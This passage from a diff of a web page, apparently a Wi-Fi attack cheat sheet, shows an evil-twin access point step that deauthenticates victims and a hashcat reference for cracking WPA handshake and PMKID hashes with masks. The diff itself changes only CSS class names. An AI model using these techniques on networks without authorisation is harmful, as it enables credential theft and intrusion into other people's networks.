-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># hostapd hostapd.conf 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># hostapd hostapd.conf 
 </code></pre></div></div>
 
 <p>5. We need to wait until victims connect to our AP. We can “help” them using deauth to disconnect them from their networks.</p>
@@ -1014,43 +1014,43 @@ ignore_broadcast_ssid=0
 </ul>
 
 <h2 id="hashcat-">Hashcat <a name="hashcat"></a></h2>
-<p><code class="highlighter-rouge">hashcat --potfile-disable --force -m 2500 [HASH_FILE] [DICT_OR_MASK]</code></p>
+<p><code class="language-plaintext highlighter-rouge">hashcat --potfile-disable --force -m 2500 [HASH_FILE] [DICT_OR_MASK]</code></p>
 <ul>
-  <li><code class="highlighter-rouge">--force</code> - run without GPU</li>
-  <li><code class="highlighter-rouge">--potfile-disable</code> - don’t use local database. for testing</li>
-  <li><code class="highlighter-rouge">-a 3</code> - bruteforce</li>
-  <li><code class="highlighter-rouge">-a 1</code> - dictionary</li>
-  <li><code class="highlighter-rouge">-m 2500</code> - mode: 4hs</li>
-  <li><code class="highlighter-rouge">-m 16800</code> - mode: pmkid</li>
+  <li><code class="language-plaintext highlighter-rouge">--force</code> - run without GPU</li>
+  <li><code class="language-plaintext highlighter-rouge">--potfile-disable</code> - don’t use local database. for testing</li>
+  <li><code class="language-plaintext highlighter-rouge">-a 3</code> - bruteforce</li>
+  <li><code class="language-plaintext highlighter-rouge">-a 1</code> - dictionary</li>
+  <li><code class="language-plaintext highlighter-rouge">-m 2500</code> - mode: 4hs</li>
+  <li><code class="language-plaintext highlighter-rouge">-m 16800</code> - mode: pmkid</li>
 </ul>
 
 <h3 id="masks">masks</h3>
 <p>built-in:</p>
 <ul>
-  <li><code class="highlighter-rouge">?l</code> = <code class="highlighter-rouge">abcdefghijklmnopqrstuvwxyz</code></li>
-  <li><code class="highlighter-rouge">?u</code> = <code class="highlighter-rouge">ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></li>
-  <li><code class="highlighter-rouge">?d</code> = <code class="highlighter-rouge">0123456789</code></li>
-  <li><code class="highlighter-rouge">?h</code> = <code class="highlighter-rouge">0123456789abcdef</code></li>
-  <li><code class="highlighter-rouge">?H</code> = <code class="highlighter-rouge">0123456789ABCDEF</code></li>
-  <li><code class="highlighter-rouge">?s</code> = <code class="highlighter-rouge">«space»!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_</code><code class="highlighter-rouge">{|}~</code></li>
-  <li><code class="highlighter-rouge">?a</code> = <code class="highlighter-rouge">?l?u?d?s</code></li>
-  <li><code class="highlighter-rouge">?b</code> = <code class="highlighter-rouge">0x00 - 0xff</code></li>
+  <li><code class="language-plaintext highlighter-rouge">?l</code> = <code class="language-plaintext highlighter-rouge">abcdefghijklmnopqrstuvwxyz</code></li>
+  <li><code class="language-plaintext highlighter-rouge">?u</code> = <code class="language-plaintext highlighter-rouge">ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></li>
+  <li><code class="language-plaintext highlighter-rouge">?d</code> = <code class="language-plaintext highlighter-rouge">0123456789</code></li>
+  <li><code class="language-plaintext highlighter-rouge">?h</code> = <code class="language-plaintext highlighter-rouge">0123456789abcdef</code></li>
+  <li><code class="language-plaintext highlighter-rouge">?H</code> = <code class="language-plaintext highlighter-rouge">0123456789ABCDEF</code></li>
+  <li><code class="language-plaintext highlighter-rouge">?s</code> = <code class="language-plaintext highlighter-rouge">«space»!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_</code><code class="language-plaintext highlighter-rouge">{|}~</code></li>
+  <li><code class="language-plaintext highlighter-rouge">?a</code> = <code class="language-plaintext highlighter-rouge">?l?u?d?s</code></li>
+  <li><code class="language-plaintext highlighter-rouge">?b</code> = <code class="language-plaintext highlighter-rouge">0x00 - 0xff</code></li>
 </ul>
 
 <p>custom charset:</p>
 <ul>
-  <li><code class="highlighter-rouge">-1 [CHARS]</code></li>
-  <li><code class="highlighter-rouge">-2 [CHARS]</code></li>
-  <li><code class="highlighter-rouge">-3 [CHARS]</code></li>
-  <li><code class="highlighter-rouge">-4 [CHARS]</code></li>
+  <li><code class="language-plaintext highlighter-rouge">-1 [CHARS]</code></li>
+  <li><code class="language-plaintext highlighter-rouge">-2 [CHARS]</code></li>
+  <li><code class="language-plaintext highlighter-rouge">-3 [CHARS]</code></li>
+  <li><code class="language-plaintext highlighter-rouge">-4 [CHARS]</code></li>
 </ul>
 
 <p>example:</p>
 <ul>
-  <li><code class="highlighter-rouge">?d?d?d?d</code> - 4 digits</li>
-  <li><code class="highlighter-rouge">-1 ?l?u?d ?1?1?d?d</code> - 2x alphanum, 2x digits</li>
-  <li><code class="highlighter-rouge">-1 ?l?u?d ?1?1?1?1?1?1?1?1</code> - 8x alphanum</li>
-  <li><code class="highlighter-rouge">-1 ?l?d ?1?1?1?1?1?1?1?1</code> - 8x alphanum lower</li>
+  <li><code class="language-plaintext highlighter-rouge">?d?d?d?d</code> - 4 digits</li>
+  <li><code class="language-plaintext highlighter-rouge">-1 ?l?u?d ?1?1?d?d</code> - 2x alphanum, 2x digits</li>
+  <li><code class="language-plaintext highlighter-rouge">-1 ?l?u?d ?1?1?1?1?1?1?1?1</code> - 8x alphanum</li>
+  <li><code class="language-plaintext highlighter-rouge">-1 ?l?d ?1?1?1?1?1?1?1?1</code> - 8x alphanum lower</li>
 </ul>
 
  	</div>
